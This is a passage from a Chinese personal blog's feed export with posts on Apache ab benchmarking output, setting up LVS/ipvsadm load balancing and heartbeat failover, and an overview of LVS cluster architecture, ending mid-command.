      <url>/2010/03/16/apache-ab/</url>
      <content type="html"><![CDATA[<p>工具AB(apache benchmark).在APACHE的bin目录下。</p><p>格式： ./ab [options] [http://]hostname[:port]/path</p><p>参数：</p><pre><code>-n requests     Number of requests to perform//在测试会话中所执行的请求个数。默认时，仅执行一个请求-c concurrency Number of multiple requests to make//一次产生的请求个数。默认是一次一个。-t timelimit    Seconds to max. wait for responses//测试所进行的最大秒数。其内部隐含值是-n 50000。它可以使对服务器的测试限制在一个固定的总时间以内。默认时，没有时间限制。-p postfile     File containing data to POST//包含了需要POST的数据的文件.-T content-type Content-type header for POSTing//POST数据所使用的Content-type头信息。-v verbosity    How much troubleshooting info to print//设置显示信息的详细程度 \- 4或更大值会显示头信息， 3或更大值可以显示响应代码(404, 200等), 2或更大值可以显示警告和其他信息。 -V 显示版本号并退出。-w              Print out results in HTML tables//以HTML表的格式输出结果。默认时，它是白色背景的两列宽度的一张表。-i              Use HEAD instead of GET</code></pre><p>   // 执行HEAD请求，而不是GET。</p><pre><code>-x attributes   String to insert as table attributes//-y attributes   String to insert as tr attributes//-z attributes   String to insert as td or th attributes//-C attribute    Add cookie, eg. &apos;Apache=1234. (repeatable)//-C cookie-name=value 对请求附加一个Cookie:行。 其典型形式是name=value的一个参数对。此参数可以重复。-H attribute    Add Arbitrary header line, eg. &apos;Accept-Encoding: gzip&apos;                Inserted after all normal header lines. (repeatable)-A attribute    Add Basic WWW Authentication, the attributes                are a colon separated username and password.-P attribute    Add Basic Proxy Authentication, the attributes                are a colon separated username and password.//-P proxy-auth-username:password 对一个中转代理提供BASIC认证信任。用户名和密码由一个:隔开，并以base64编码形式发送。无论服务器是否需要(即, 是否发送了401认证需求代码)，此字符串都会被发送。-X proxy:port   Proxyserver and port number to use-V              Print version number and exit-k              Use HTTP KeepAlive feature-d              Do not show percentiles served table.-S              Do not show confidence estimators and warnings.-g filename     Output collected data to gnuplot format file.-e filename     Output CSV file with percentages served-h              Display usage information (this message)//-attributes 设置 属性的字符串. 缺陷程序中有各种静态声明的固定长度的缓冲区。另外，对命令行参数、服务器的响应头和其他外部输入的解析也很简单，这可能会有不良后果。它没有完整地实现 HTTP/1.x; 仅接受某些&apos;预想&apos;的响应格式。 strstr(3)的频繁使用可能会带来性能问题，即, 你可能是在测试ab而不是服务器的性能。</code></pre><p>参数很多,一般我们用 -c 和 -n 参数就可以了. 例如:</p><p>./ab -c 1000 -n 1000 <a href="http://127.0.0.1/index.php" target="_blank" rel="noopener">http://127.0.0.1/index.php</a></p><p>这个表示同时处理1000个请求并运行1000次index.php文件.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">#/usr/local/xiaobai/apache2054/bin/ab -c 1000 -n 1000 [http://127.0.0.1/index.html.zh-cn.gb2312](http://127.0.0.1/index.html.zh-cn.gb2312)</span><br><span class="line"></span><br><span class="line">This is ApacheBench, Version 2.0.41-dev &lt;$Revision: 1.121.2.12 $&gt; apache-2.0</span><br><span class="line"></span><br><span class="line">Copyright (c) 1996 Adam Twiss, Zeus Technology Ltd, [http://www.zeustech.net/](http://www.zeustech.net/)</span><br><span class="line"></span><br><span class="line">Copyright (c) 1998-2002 The Apache Software Foundation, [http://www.apache.org/](http://www.apache.org/)</span><br><span class="line"></span><br><span class="line">Benchmarking 127.0.0.1 (be patient)</span><br><span class="line"></span><br><span class="line">Completed 100 requests</span><br><span class="line"></span><br><span class="line">Completed 200 requests</span><br><span class="line"></span><br><span class="line">Completed 300 requests</span><br><span class="line"></span><br><span class="line">Completed 400 requests</span><br><span class="line"></span><br><span class="line">Completed 500 requests</span><br><span class="line"></span><br><span class="line">Completed 600 requests</span><br><span class="line"></span><br><span class="line">Completed 700 requests</span><br><span class="line"></span><br><span class="line">Completed 800 requests</span><br><span class="line"></span><br><span class="line">Completed 900 requests</span><br><span class="line"></span><br><span class="line">Finished 1000 requests</span><br><span class="line"></span><br><span class="line">Server Software:        Apache/2.0.54</span><br><span class="line"></span><br><span class="line">//平台apache 版本2.0.54</span><br><span class="line"></span><br><span class="line">Server Hostname:        127.0.0.1</span><br><span class="line"></span><br><span class="line">//服务器主机名</span><br><span class="line"></span><br><span class="line">Server Port:            80</span><br><span class="line"></span><br><span class="line">//服务器端口</span><br><span class="line"></span><br><span class="line">Document Path:          /index.html.zh-cn.gb2312</span><br><span class="line"></span><br><span class="line">//测试的页面文档</span><br><span class="line"></span><br><span class="line">Document Length:        1018 bytes</span><br><span class="line"></span><br><span class="line">//文档大小</span><br><span class="line"></span><br><span class="line">Concurrency Level:      1000</span><br><span class="line"></span><br><span class="line">//并发数</span><br><span class="line"></span><br><span class="line">Time taken for tests:   8.188731 seconds</span><br><span class="line"></span><br><span class="line">//整个测试持续的时间</span><br><span class="line"></span><br><span class="line">Complete requests:      1000</span><br><span class="line"></span><br><span class="line">//完成的请求数量</span><br><span class="line"></span><br><span class="line">Failed requests:        0</span><br><span class="line"></span><br><span class="line">//失败的请求数量</span><br><span class="line"></span><br><span class="line">Write errors:           0</span><br><span class="line"></span><br><span class="line">Total transferred:      1361581 bytes</span><br><span class="line"></span><br><span class="line">//整个场景中的网络传输量</span><br><span class="line"></span><br><span class="line">HTML transferred:       1055666 bytes</span><br><span class="line"></span><br><span class="line">//整个场景中的HTML内容传输量</span><br><span class="line"></span><br><span class="line">Requests per second:    122.12 [#/sec] (mean)</span><br><span class="line"></span><br><span class="line">//大家最关心的指标之一，相当于 LR 中的 每秒事务数 ，后面括号中的 mean 表示这是一个平均值</span><br><span class="line"></span><br><span class="line">Time per request:       8188.731 [ms] (mean)</span><br><span class="line"></span><br><span class="line">//大家最关心的指标之二，相当于 LR 中的 平均事务响应时间 ，后面括号中的 mean 表示这是一个平均值</span><br><span class="line"></span><br><span class="line">Time per request:       8.189 [ms] (mean, across all concurrent requests)</span><br><span class="line"></span><br><span class="line">//每个请求实际运行时间的平均值</span><br><span class="line"></span><br><span class="line">Transfer rate:          162.30 [Kbytes/sec] received</span><br><span class="line"></span><br><span class="line">//平均每秒网络上的流量，可以帮助排除是否存在网络流量过大导致响应时间延长的问题</span><br><span class="line"></span><br><span class="line">Connection Times (ms)</span><br><span class="line"></span><br><span class="line">              min mean[+/-sd] median   max</span><br><span class="line"></span><br><span class="line">Connect:        4 646 1078.7     89    3291</span><br><span class="line"></span><br><span class="line">Processing:   165 992 493.1    938    4712</span><br><span class="line"></span><br><span class="line">Waiting:      118 934 480.6    882    4554</span><br><span class="line"></span><br><span class="line">Total:        813 1638 1338.9   1093    7785</span><br><span class="line"></span><br><span class="line">//网络上消耗的时间的分解，各项数据的具体算法还不是很清楚</span><br><span class="line"></span><br><span class="line">Percentage of the requests served within a certain time (ms)</span><br><span class="line"></span><br><span class="line">50%   1093</span><br><span class="line"></span><br><span class="line">66%   1247</span><br><span class="line"></span><br><span class="line">75%   1373</span><br><span class="line"></span><br><span class="line">80%   1493</span><br><span class="line"></span><br><span class="line">90%   4061</span><br><span class="line"></span><br><span class="line">95%   4398</span><br><span class="line"></span><br><span class="line">98%   5608</span><br><span class="line"></span><br><span class="line">99%   7368</span><br><span class="line"></span><br><span class="line">100%   7785 (longest request)</span><br></pre></td></tr></table></figure></p><p>//整个场景中所有请求的响应情况。在场景中每个请求都有一个响应时间，其中50％的用户响应时间小于1093 毫秒，60％ 的用户响应时间小于1247 毫秒，最大的响应时间小于7785 毫秒</p><pre><code>由于对于并发请求，cpu实际上并不是同时处理的，而是按照每个请求获得的时间片逐个轮转处理的，所以基本上第一个Time per request时间约等于第二个Time per request时间乘以并发请求数</code></pre>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux 负载均衡</title>
      <link href="/2010/01/23/linux-load-balancing/"/>
      <url>/2010/01/23/linux-load-balancing/</url>
      <content type="html"><![CDATA[<p>在调度器的实现技术中，IP负载均衡技术是效率最高的。在已有的IP负载均衡技术中有通过网络地址转换（Network Address Translation）将一组服务器构成一个高性能的、高可用的虚拟服务器，我们称之为VS/NAT技术（Virtual Server via Network Address Translation），大多数商品化的IP负载均衡调度器产品都是使用此方法，如Cisco的LocalDirector、F5的Big/IP和Alteon的ACEDirector。在分析VS/NAT的缺点和网络服务的非对称性的基础上，我们提出通过IP隧道实现虚拟服务器的方法VS/TUN（Virtual Server via IP Tunneling），和通过直接路由实现虚拟服务器的方法VS/DR（Virtual Server via Direct Routing），它们可以极大地提高系统的伸缩性。所以，IPVS软件实现了这三种IP负载均衡技术，它们的大致原理如下</p><p>1) Virtual Server via Network Address Translation（VS/NAT）</p><p>通过网络地址转换，调度器重写请求报文的目标地址，根据预设的调度算法，将请求分派给后端的真实服务器；真实服务器的响应报文通过调度器时，报文的源地址被重写，再返回给客户，完成整个负载调度过程。</p><p>2)Virtual Server via IP Tunneling（VS/TUN）</p><p>采用NAT技术时，由于请求和响应报文都必须经过调度器地址重写，当客户请求越来越多时，调度器的处理能力将成为瓶颈。为了解决这个问题，调度器把请求报文通过IP隧道转发至真实服务器，而真实服务器将响应直接返回给客户，所以调度器只处理请求报文。由于一般网络服务应答比请求报文大许多，采用VS/TUN技术后，集群系统的最大吞吐量可以提高10倍。</p><p>3)Virtual Server via Direct Routing（VS/DR）</p><p>VS/DR通过改写请求报文的MAC地址，将请求发送到真实服务器，而真实服务器将响应直接返回给客户。同VS/TUN技术一样，VS/DR技术可极大地提高集群系统的伸缩性。这种方法没有IP隧道的开销，对集群中的真实服务器也没有必须支持IP隧道协议的要求，但是要求调度器与真实服务器都有一块网卡连在同一物理网段上。</p><p>针对不同的网络服务需求和服务器配置，IPVS调度器实现了如下八种负载调度算法,这里我只介绍前四种,因为后面的基本不常用:</p><p>1)轮叫（Round Robin）</p><p>调度器通过”轮叫”调度算法将外部请求按顺序轮流分配到集群中的真实服务器上，它均等地对待每一台服务器，而不管服务器上实际的连接数和系统负载。</p><p>2)加权轮叫（Weighted Round Robin）</p><p>调度器通过”加权轮叫”调度算法根据真实服务器的不同处理能力来调度访问请求。这样可以保证处理能力强的服务器处理更多的访问流量。调度器可以自动问询真实服务器的负载情况，并动态地调整其权值。</p><p>3)最少链接（Least Connections）</p><p>调度器通过”最少连接”调度算法动态地将网络请求调度到已建立的链接数最少的服务器上。如果集群系统的真实服务器具有相近的系统性能，采用”最小连接”调度算法可以较好地均衡负载。</p><p>4)加权最少链接（Weighted Least Connections）</p><p>在集群系统中的服务器性能差异较大的情况下，调度器采用”加权最少链接”调度算法优化负载均衡性能，具有较高权值的服务器将承受较大比例的活动连接负载。调度器可以自动问询真实服务器的负载情况，并动态地调整其权值。</p><p>我在这里做的实验采用的基于VS/NAT,轮叫机制,这样是因为我的两台服务器是完全一样的性能,所以采用轮叫的方法.如果在公司里,要根据不同的情况选择不同的部署方案,要看实际的需要和设备的实际情况来考虑.</p><p>同样我还是采用三台虚拟机,里面还是Linux AS5的版本,其中作为虚拟主机的机器要做双ip,一个内网,一个外网</p><p>我的拓扑图</p><p><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/img1_51cto_200712031196675549406.jpg" alt="Linux 负载均衡 - suchalin - 为了更好的生活而奋斗！" title="Linux 负载均衡 - suchalin - 为了更好的生活而奋斗！"></p><p>1) 下载ipvsadm软件包，下载地址：<a href="http://www.linuxvirtualserver.org/" target="_blank" rel="noopener">[url]http://www.linuxvirtualserver.org/[/url]</a> </p><pre><code>我下载的是ipvsadm-1.24.tar.gz</code></pre><p>2）正常的步骤应该是先编译内核，因为ipvsadm要求内核在2.4.24以后的版本，为了省事，我直接用的是AS5，它的内核是2.6.18（可以使用uname -an察看系统内核信息）</p><p>3）软件包下载完成后，就要编译和安装ipvsadm了。</p><p>   先要对内核进行软连接，因为ipvsadm在安装的过程中先要去查找/usr/src/linux 这个信息，所以我们要先把内核信息做软连接到/usr/src/linux。如果不这么做，在安装的过程中会报错，如图</p><p><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/img1_51cto_200712031196674386359.bmp" alt="Linux 负载均衡 - suchalin - 为了更好的生活而奋斗！" title="Linux 负载均衡 - suchalin - 为了更好的生活而奋斗！"></p><p>   软连接方法：ln -s /usr/src/kernels/2.6.18-53.el5-i686 /usr/src/linux</p><p>4）包的解压 安装</p><p>   tar -zxvf ipvsadm-1.24</p><p>   cd ipvsadm-1.24</p><p>   make all</p><p>   make install</p><p>   安装完成后 可以察看版本信息 ipvsadm –version</p><p>   pvsadm v1.24 2005/12/10 (compiled with popt and IPVS v1.2.1)</p><p>5) 配置LVS</p><p>   在虚拟主机中启用转发功能</p><p>   echo “1”&gt;/proc/sys/net/ipv4/ip_forward    (因为虚拟主机在服务前段主要是负责ip的转发的，所以这项要启动)</p><p>   清除ipvsadm表</p><p>   ipvsadm -C  </p><p>   安装LVS服务</p><p>   ipvsadm -A -t 10.1.1.200:80 -s rr</p><p>   增加第一台服务器</p><p>   ipvsadm -a -t 10.1.1.200:80 -r 192.168.1.100:80 -m -w 1</p><p>   增加第二台服务器</p><p>   ipvsadm -a -t 10.1.1.200:80 -r 192.168.1.200:80 -m -w 1</p><p>   注意-w 后的是1而不是l</p><p>6) 配置服务器端</p><p>   在192.168.1.100和192.168.1.200里分别将网关设置为192.168.1.254，并启动WEB服务（192.168.1.254是虚拟主机的内网IP）</p><p>7）测试</p><pre><code>我在客户机上分别建立了两个主页,并启动WEB服务![Linux 负载均衡 - suchalin - 为了更好的生活而奋斗！](http://blog.atop.fun/wp-content/uploads/netease/other_site/img1_51cto_200712031196675116093.jpg &quot;Linux 负载均衡 - suchalin - 为了更好的生活而奋斗！&quot;)</code></pre><p><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/img1_51cto_200712031196675140531.jpg" alt="Linux 负载均衡 - suchalin - 为了更好的生活而奋斗！" title="Linux 负载均衡 - suchalin - 为了更好的生活而奋斗！"></p><pre><code>在客户端多次浏览10.1.1.200（前端的虚拟主机ip），然后在虚拟主机上输入ipvsadm，会发现已经转发了4次</code></pre><p>这个是我在访问前后的效果</p><p><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/img1_51cto_200712031196675241421.jpg" alt="Linux 负载均衡 - suchalin - 为了更好的生活而奋斗！" title="Linux 负载均衡 - suchalin - 为了更好的生活而奋斗！"></p><p>现在我在访问同样一个10.1.1.200,也就是我的虚拟主机时,会发现是不同的网页</p><p><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/img1_51cto_200712031196675354390.jpg" alt="Linux 负载均衡 - suchalin - 为了更好的生活而奋斗！" title="Linux 负载均衡 - suchalin - 为了更好的生活而奋斗！"></p><p><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/img1_51cto_200712031196675390203.jpg" alt="Linux 负载均衡 - suchalin - 为了更好的生活而奋斗！" title="Linux 负载均衡 - suchalin - 为了更好的生活而奋斗！"></p><p>为了能看出效果,所以我弄的是两个不同的网页.在实际中,应该两个完全一样的主页,这样,虽然客户访问的同一个IP 看到同一个主页,实际上是两台不同的服务器,这样就达到了负载均衡的效果.然后在下端应用上HA(心跳连接),这样一个高可用的集群就算部署好了.</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux负载均衡专题(个人心得和笔记按照下面的步骤就能建立可用的集群)</title>
      <link href="/2010/01/23/linux-load-balancing-topics-personal-notes-and-notes-can-build-available-clusters-as-follows/"/>
      <url>/2010/01/23/linux-load-balancing-topics-personal-notes-and-notes-can-build-available-clusters-as-follows/</url>
      <content type="html"><![CDATA[<p>haproxy+keepalived</p><p>Linux企业集群</p><p><a href="http://book.51cto.com/art/200806/76015.htm" target="_blank" rel="noopener">http://book.51cto.com/art/200806/76015.htm</a>#</p><p>第一步:rsync同步web数据（测试通过并且自己加入了ssh的RSA key验证）</p><p><a href="http://www.linuxsir.org/main/?q=node/256" target="_blank" rel="noopener">http://www.linuxsir.org/main/?q=node/256</a>   rsync 服务器架设方法 v0.1b （正在修订中）</p><p>第二步:安装heartbeat并且可以故障切换(正在学习中..)</p><p>centos 5.2</p><p>yum install -y heartbeat heartbeat-devel heartbeat-ldirectord heartbeat-gui piranha</p><p>第三步:配置heartbeat</p><p>因为是rpm安装所以默认/etc/ha.d/中没有包含ha.cf,authkeys,haresources这三个文件必须拷贝过来</p><p>rpm查询cat /etc/ha.d/README.config</p><p>You need three configuration files to make heartbeat happy,<br>and they all go in this directory.</p><p>They are:<br>        ha.cf           Main configuration file<br>        haresources     Resource configuration file<br>        authkeys        Authentication information</p><p>These first two may be readable by everyone, but the authkeys file<br>must not be.</p><p>The good news is that sample versions of these files may be found in<br>the documentation directory (providing you installed the documentation).</p><p>If you installed heartbeat using rpm packages then<br>this command will show you where they are on your system:<br>                rpm -q heartbeat -d</p><p>If you installed heartbeat using Debian packages then<br>the documentation should be located in /usr/share/doc/heartbeat</p><p>然后利用cp把三个文件拷贝到/etc/ha.d/中</p><p>第四步:具体安装</p><p><a href="http://linux.chinaunix.net/bbs/viewthread.php?tid=1051263" target="_blank" rel="noopener">http://linux.chinaunix.net/bbs/viewthread.php?tid=1051263</a></p><p>heartbeat2.x的测试终结篇，针对使用heartbeat的新手</p><p>注意:例如我们想做httpd的双机热备份的话,首先要把httpd的启动脚本从init中删除</p><p>chkconfig –del httpd</p><p>chkconfig –level 345 httpd off</p><p>删除完成以后修改haresources</p><p>HA2 192.168.0.40 httpd</p><p>注意这里生成完成了还是不能用必须用/usr/lib/heartbeat/haresources2cib.py haresources重新弄cib.xml和cib.xml.sig</p><p>主题：heartbeat V2在CentOS4.6上简要安装、配置笔记</p><p><a href="http://www.javaeye.com/topic/191076" target="_blank" rel="noopener">http://www.javaeye.com/topic/191076</a></p><p>heartbeat2.1.4 实现监控应用服务(mysql)具体步骤<br><a href="http://www.china-lg.com/blog/index.php?play=show&amp;id=553" target="_blank" rel="noopener">http://www.china-lg.com/blog/index.php?play=show&amp;id=553</a></p><p>Linux 上的高可用中间件，第 1 部分: heartbeat 与 Apache Web 服务器</p><p><a href="http://www.ibm.com/developerworks/cn/linux/l-halinux/index.html" target="_blank" rel="noopener">http://www.ibm.com/developerworks/cn/linux/l-halinux/index.html</a></p><p>LVS+Heartbeat+Ldirectord在RHEL5上</p><p><a href="http://blog.chinaunix.net/u2/82873/showart_1405630.html" target="_blank" rel="noopener">http://blog.chinaunix.net/u2/82873/showart_1405630.html</a></p><p>基于LVS的互联网应用</p><p><a href="http://unix.ctocio.com.cn/196/8689196_5.shtml" target="_blank" rel="noopener">http://unix.ctocio.com.cn/196/8689196_5.shtml</a></p><p>基于LVS的Linux负载均衡技术实现</p><p> <a href="http://net.it168.com/a2008/0731/199/000000199163.shtml" target="_blank" rel="noopener">http://net.it168.com/a2008/0731/199/000000199163.shtml</a></p><p>ipvsadm Man</p><p><a href="http://linux.die.net/man/8/ipvsadm" target="_blank" rel="noopener">http://linux.die.net/man/8/ipvsadm</a></p><p> 利用LVS+Keepalived 实现高性能高可用负载均衡服务器</p><p><a href="http://www.linuxtone.org/thread-1077-1-1.html" target="_blank" rel="noopener">http://www.linuxtone.org/thread-1077-1-1.html</a></p><p>Linux Virtual Server负载均衡 ipvsadm使用方法</p><p><a href="http://www.lslnet.com/linux/docs/linux-7916.htm" target="_blank" rel="noopener">http://www.lslnet.com/linux/docs/linux-7916.htm</a></p><p>使用LVS（Linux Virtual Server）在Linux上搭建负载均衡的集群服务</p><p><a href="http://www.clusting.com/cluster/load_balancing/LVS_1.html" target="_blank" rel="noopener">http://www.clusting.com/cluster/load_balancing/LVS_1.html</a></p><p>请教LVS三种工作模式和算法、session保持的问题！！！</p><p>有几个关LVS问题，小弟想请教一下：<br>1、<br>在配置LVS时，小弟想用DR模式。我想请问一下如果确定使用此模式，或是改用NAT 或是TUN模式时，该通过ipvsadm的哪个命令参数指定，ipvsadm -A -t $VIP:80 -s rr 变化rr 这个参数指定的。<br>2、LVS的十种轮询算法，该如何通过配置文件或是命令指定。</p><p>3、在配置LVS不知道该如何解决session保持的问题，因为有些电子商务网站需要始终保持同一个连接，连接到同一个realserver.</p><p>-m NAT<br>-i TUN<br>算法：<br>-s 指定<br>session保持：-p</p><p>—这全在手册中，或者ipvsadm -h都可以查到</p><p>多谢指点已经明白，小弟还有一问，请指点，，，</p><p>关于网站后台数据库或资料同步的问题，小弟想到如下办法：前提在没有做共享磁盘的前提下，如果数据库想要同步的话，可能要配置oracle热备，如果是mysql就可配置主从，等等，关于网站其它文件，如图片之类的，小弟想到rsync 或是在上传时同步上传。如果是做了共享磁盘，如果/date目录吧。那么几台realserver可以挂载此目录到本机了，网站的数据，还数据库都可以放在此目录了。。但问题是多个realserve要是同时写一个文件时，该如果是好呢？不知是否支持并行写入，小弟觉得关于集群配置磁盘共享这块，也就是多个realserver数据同步的问题不太好解决，也是小弟最大凝问之处，很想有机会搭建SAN,或是NAS，好好试验一下，如果搭建NAS，，使用linux的NFS就可以吧。而且也有一些集群文件系统GFS之类，等等。。。一直不太明确后端数据存储的一致性问题。</p><p><a href="http://www.diybl.com/course/6_system/linux/Linuxjs/200868/123619.html" target="_blank" rel="noopener">http://www.diybl.com/course/6_system/linux/Linuxjs/200868/123619.html</a></p><p>在RHEL5中用piranha架设squid的lvs集群</p><p><a href="http://www.yatan.com/group/topic.php?tid=21513" target="_blank" rel="noopener">http://www.yatan.com/group/topic.php?tid=21513</a></p><p>在RHEL4系统中配置LVS负载均衡群集</p><p><a href="http://www.linuxbyte.net.cn/article/rhel/2008-08-10/843.html" target="_blank" rel="noopener">http://www.linuxbyte.net.cn/article/rhel/2008-08-10/843.html</a></p><p>RHEL-LVS 实验（1）VS-NAT<br><a href="http://www.linuxtopia.org/online_books/rhel5/rhel5_clustering_guide/rhel5_cluster_s2-lvs-routing-CSO.html" target="_blank" rel="noopener">http://www.linuxtopia.org/online_books/rhel5/rhel5_clustering_guide/rhel5_cluster_s2-lvs-routing-CSO.html</a></p><p>rhel 5 cluseter</p><p><a href="http://blog.80s.net.cn/?p=476" target="_blank" rel="noopener">http://blog.80s.net.cn/?p=476</a></p><p>lvs安装以及配置</p><p><a href="http://tech.ddvip.com/2008-11/122768078295163_3.html" target="_blank" rel="noopener">http://tech.ddvip.com/2008-11/122768078295163_3.html</a></p><p>redhatAS4.2 安装集群LVS<br><a href="http://bbs.bbsgood.com/post_45_129231_1.html" target="_blank" rel="noopener">http://bbs.bbsgood.com/post_45_129231_1.html</a></p><p>虚拟机中的lvs负载均衡</p><p>本文来自CSDN博客，转载请标明出处：<a href="http://blog.csdn.net/cnbird2008/archive/2009/01/25/3853108.aspx" target="_blank" rel="noopener">http://blog.csdn.net/cnbird2008/archive/2009/01/25/3853108.aspx</a></p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>集群管理工具</title>
      <link href="/2010/01/23/cluster-management-tool/"/>
      <url>/2010/01/23/cluster-management-tool/</url>
      <content type="html"><![CDATA[<p>synctool 是一个集群管理工具，用来在集群中的所有节点间进行保证配置文件的同步。节点可以是一个逻辑组和类的一部分，它们可能需要部分的配置文件。synctool 守护进程可以根据配置更改而对应用进行重启，还包括执行一些其他的管理任务。</p><p>新版本增加了一个新的工具 synctool-scp ，你可以使用这个工具来将文件复制到集群中的所有节点。</p><p><a href="http://freshmeat.net/projects/synctool" target="_blank" rel="noopener">下载 Synctool 4.2</a></p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>LVS集群技术</title>
      <link href="/2010/01/23/lvs-cluster-technology/"/>
      <url>/2010/01/23/lvs-cluster-technology/</url>
      <content type="html"><![CDATA[<p>集群技术主要分为三大类：</p><ul><li><p>高可用性(High Available Cluster)，例：</p><p><a href="http://www.linux-ha.org/" target="_blank" rel="noopener">Linux-HA</a></p></li><li><p>负载均衡(Load balancing Cluster)，例：</p><p><a href="http://www.linuxvirtualserver.org/" target="_blank" rel="noopener">LVS</a></p><p>、</p><p><a href="http://www.mosix.org/" target="_blank" rel="noopener">MOSIX</a></p></li><li><p>高性能计算(High Performance Computing)，例：</p><p><a href="http://www.beowulf.org/" target="_blank" rel="noopener">Beowulf</a></p></li></ul><p>我们这里使用RedHat AS 3.x，LVS，Linux-HA，Ldirectord，构造一个高可用的负载均衡集群系统。如图：</p><p><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/zh_linuxvirtualserver_lvs-architecture.jpg" alt=" LVS集群技术 - suchalin - 为了更好的生活而奋斗！" title=" LVS集群技术 - suchalin - 为了更好的生活而奋斗！">screen.width*0.7) {this.resized=true; this.width=screen.width*0.7; this.alt=’Click here to open new window\nCTRL+Mouse wheel to zoom in/out’;}”&gt;</p><p>各层的作用：</p><ul><li><p>Load Balancer(负载均衡器)：</p><pre><code>Load Balancer是整个集群系统的前端，负责把客户请求转发到Real Server上。Backup是备份Load Balancer，当Load Balancer不可用时接替它，成为实际的Load Balancer。Load Balancer通过Ldirectord监测各Real Server的健康状况。在Real Server不可用时</code></pre><p>把它从群中剔除，恢复时重新加入。</p></li><li><p>Server Array(服务器群)：</p><pre><code>Server Array是一组运行实际应用服务的机器，比如WEB, Mail, FTP, DNS, Media等等。在实际应用中，Load Balancer和Backup也可以兼任Real Server的角色。</code></pre></li><li><p>Shared Storage(共享存储)：</p><pre><code>Shared Storage为所有Real Server提供共享存储空间和一致的数据内容。</code></pre></li></ul><p>各服务器IP分配：</p><p>Virtual IP：</p><p>192.168.136.10</p><p>Load Balancer：</p><p>192.168.136.11</p><p>Backup：</p><p>192.168.136.12</p><p>Real Server 1：</p><p>192.168.136.101</p><p>Real Server 2：</p><p>192.168.136.102</p><p>Real Server 3：</p><p>192.168.136.103</p><p>IPVS</p><p>IPVS是LVS集群系统的核心软件，它的主要作用是：</p><ul><li>安装在Load Balancer上，把发往Virtual IP的请求转发到Real Server上。</li></ul><p>IPVS的负载均衡机制有三种，这里使用IP Tunneling机制：</p><ul><li>Virtual Server via NAT</li><li>Virtual Server via IP Tunneling</li><li>Virtual Server via Direct Routing</li></ul><p>IPVS的负载调度算法有十种：</p><ul><li>轮叫（Round Robin）</li><li>加权轮叫（Weighted Round Robin）</li><li>最少链接（Least Connections）</li><li>加权最少链接（Weighted Least Connections）</li><li>基于局部性的最少链接（Locality-Based Least Connections）</li><li>带复制的基于局部性最少链接（Locality-Based Least Connections with Replication）</li><li>目标地址散列（Destination Hashing ）</li><li>源地址散列（Source Hashing）</li><li>最短期望延迟(Shortest Expected Delay)</li><li>无须队列等待（Never Queue）</li></ul><p>IPVS安装主要包括三方面：</p><ul><li>在Load Banlancer上安装IPVS内核补丁</li><li>在Load Banlancer上安装IPVS管理软件</li><li>在Real Server上安装ARP hidden内核补丁</li></ul><p>关于如何编译内核请参考其他文档，这里使用从UltraMonkey下载的已编译好的内核。</p><p>在Load Banlancer、Backup和Real Server上使用同一内核，IPVS和ARP hidden都已编译在这个内核里：</p><p>wget <a 